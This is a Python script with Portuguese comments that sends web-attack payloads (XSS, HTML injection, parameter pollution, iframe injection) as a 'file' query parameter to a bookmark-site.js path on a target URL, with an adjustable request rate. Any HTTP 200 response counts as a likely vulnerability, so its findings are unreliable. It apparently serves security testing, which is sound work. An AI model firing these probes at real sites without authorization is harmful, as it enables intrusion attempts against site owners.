import httpx
import asyncio
import sys
from urllib.parse import quote
import time

if len(sys.argv) > 2:
    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
    taxa_envio = sys.argv[2]  # Recebe a taxa de envio como segundo argumento
else:
    print("URL base e/ou taxa de envio não foram fornecidas.")
    sys.exit(1)

# Mapeia a taxa de envio para um intervalo de tempo específico
delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
delay = delays.get(taxa_envio, 2)  # Usa 'medio' como padrão se a taxa não for reconhecida

url_alvo = f"{url_base}/javascript/bookmark-site.js"
print(url_alvo)

# Payloads para testar
payloads = {
    'Cross Site Scripting': "<script>alert('XSS')</script>",
    'HTML Injection': "<h1>HTML Injection</h1>",
    'HTTP Parameter Pollution': "valid_file.pdf&file=malicious_file.txt",
    'Frame Source Injection': "<iframe src='httpw://google.com'></iframe>",
}

async def enviar_requisicao_e_verificar_resposta(payload, tipo_vulnerabilidade, teste_numero):
    url_completa = f"{url_alvo}?file={quote(payload)}"
    async with httpx.AsyncClient() as client:
        resposta_teste = await client.get(url_completa)

        print(f"Teste {teste_numero}: Testando '{tipo_vulnerabilidade}'. Código de status: {resposta_teste.status_code}")
        
        if resposta_teste.status_code == 200:
            print(f"Teste #{teste_numero} PASSOU: Vulnerabilidade '{tipo_vulnerabilidade}' possivelmente encontrada!")
            return 1
        else:
            print(f"Teste #{teste_numero} FALHOU: Código de status: {resposta_teste.status_code}.")
            return 0
        
async def executar_testes():
    total_testes = 0
    testes_passaram = 0
    testes_falharam = 0

    for tipo_vulnerabilidade, payload in payloads.items():
        total_testes += 1
        resultado_teste = await enviar_requisicao_e_verificar_resposta(payload, tipo_vulnerabilidade, total_testes)
        if resultado_teste == 1:
            testes_passaram += 1
        else:
            testes_falharam += 1
        time.sleep(delay)  # Adiciona uma pausa entre as requisições baseada na taxa de envio
        
    print(f"\nTotal de Testes: {total_testes}")
    print(f"Testes Passaram: {testes_passaram}")
    print(f"Testes Falharam: {testes_falharam}")
    print(f"Url Testada: {url_alvo}")

if __name__ == "__main__":
    asyncio.run(executar_testes())
